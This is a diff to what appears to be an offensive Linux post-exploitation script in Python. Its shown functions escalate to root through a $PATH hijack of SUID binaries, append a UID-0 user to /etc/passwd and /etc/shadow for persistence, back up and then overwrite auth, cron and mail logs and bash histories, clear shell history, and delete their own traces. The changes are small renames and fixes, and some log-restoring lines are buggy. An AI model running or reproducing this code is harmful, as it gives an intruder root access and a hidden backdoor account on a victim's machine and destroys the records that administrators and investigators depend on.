@@ -287,14 +287,14 @@ def disable_hist():
    os.system("touch /tmp/pwd.txt")
 
    print("\n### creating backups of log files... ###")
-   os.system("mkdir /tmp/.backups")
-   os.system("cp /var/log/auth.log /tmp/.backups/ 2>/dev/null")
-   os.system("cp /var/log/cron.log /tmp/.backups/ 2>/dev/null")
-   os.system("cp /var/log/maillog /tmp/.backups/ 2>/dev/null")
-   os.system("cp /var/log/httpd /tmp/.backups/ 2>/dev/null")
-   os.system("cp ~/.bash_history /tmp/.backups/ 2>/dev/null")
-   os.system("cp /root/.bash_history /tmp/.backups/ 2>/dev/null")
-   os.system("echo $history > /tmp/.backups/history 2>/dev/null")
+   os.system("mkdir /tmp/backups")
+   os.system("cp /var/log/auth.log /tmp/backups/ 2>/dev/null")
+   os.system("cp /var/log/cron.log /tmp/backups/ 2>/dev/null")
+   os.system("cp /var/log/maillog /tmp/backups/ 2>/dev/null")
+   os.system("cp /var/log/httpd /tmp/backups/ 2>/dev/null")
+   os.system("cp ~/.bash_history /tmp/backups/ 2>/dev/null")
+   os.system("cp /root/.bash_history /tmp/backups/ 2>/dev/null")
+   os.system("echo $history > /tmp/backups/history 2>/dev/null")
    os.system("history -c 2>/dev/null")
    os.system("history -w 2>/dev/null")
 
@@ -461,6 +461,7 @@ def path():
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###\n")
    with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
+      os.system("echo '' > /tmp/file.txt")
       for line in lines:
          os.system("file {} >> /tmp/file.txt".format(line.strip()))
          os.system("echo '' >> /tmp/file.txt")
@@ -483,7 +484,7 @@ def path():
             non_path_cmd = re.search("\s{}\s".format(cmd), f)
             if non_path_cmd:
                os.system("echo '### {} does not specify full path of *{}* command... run 'whoami' to confirm root privileges ###' | tee -a /tmp/path_res.txt".format(path,cmd))
-               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,cmd,path))
+               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&bash {}".format(cmd,cmd,cmd,cmd,path))
                break
             else:
                continue
@@ -492,9 +493,9 @@ def path():
 # try writing to /etc/passwd or /etc/shadow
 def pass_shadow(username,password):
    print("\n### checking if /etc/passwd or /etc/shadow are writable... ###")
-   os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
-   pass_file = open("/tmp/.backups/pass.txt", "r")
-   new_user_pass = pass_file.readlines()[-1].strip()
+   os.system("mkpasswd {} > /tmp/backups/pass.txt".format(password))
+   pass_file = open("/tmp/backups/pass.txt", "r")
+   new_user_pass = pass_file.readline().strip()
 
    # check if /etc/passwd is writable and if so, add root user
    os.system("ls -l /etc/passwd > /tmp/passwd.txt")
@@ -573,8 +574,8 @@ def perm_check():
 def add_user(username,password):
    if username:
       print("\n### establishing persistence... ###")
-      os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
-      pass_file = open("/tmp/.backups/pass.txt", "r")
+      os.system("mkpasswd {} > /tmp/backups/pass.txt".format(password))
+      pass_file = open("/tmp/backups/pass.txt", "r")
       new_user_pass = pass_file.readlines()[-1].strip()
       os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
       os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
@@ -717,16 +718,16 @@ def clear_tracks(username,password,local_ip,local_port):
    os.system("echo ' ' > /root/.bash_history 2>/dev/null")
 
    # placing old contents back into logs
-   os.system("echo /tmp/.backups/auth.log > /var/log/auth.log 2>/dev/null")
-   os.system("echo /tmp/.backups/cron.log > /var/log/cron.log 2>/dev/null")
-   os.system("echo /tmp/.backups/maillog > /var/log/maillog 2>/dev/null")
-   os.system("echo /tmp/.backups/httpd > /var/log/httpd 2>/dev/null")
-   os.system("echo /tmp/.backups/.bash_history > ~/.bash_history 2>/dev/null")
-   os.system("echo /tmp/.backups/.bash_history > /root/.bash_history 2>/dev/null")
-   os.system("echo /tmp/.backups/history > $history 2>/dev/null")
+   os.system("echo /tmp/backups/auth.log > /var/log/auth.log 2>/dev/null")
+   os.system("echo /tmp/backups/cron.log > /var/log/cron.log 2>/dev/null")
+   os.system("echo /tmp/backups/maillog > /var/log/maillog 2>/dev/null")
+   os.system("echo /tmp/backups/httpd > /var/log/httpd 2>/dev/null")
+   os.system("echo /tmp/backups/.bash_history > ~/.bash_history 2>/dev/null")
+   os.system("echo /tmp/backups/.bash_history > /root/.bash_history 2>/dev/null")
+   os.system("echo /tmp/backups/history > $history 2>/dev/null")
 
    print("\n### deleting script and exiting... ###")
-   os.system("rm -rf /tmp/.backups/ 2>/dev/null")
+   os.system("rm -rf /tmp/backups/ 2>/dev/null")
    os.system("rm -rf /tmp/.path/ 2>/dev/null")
    os.system("rm -f /tmp/whoami.txt")
    os.system("rm -f /tmp/pwd.txt")
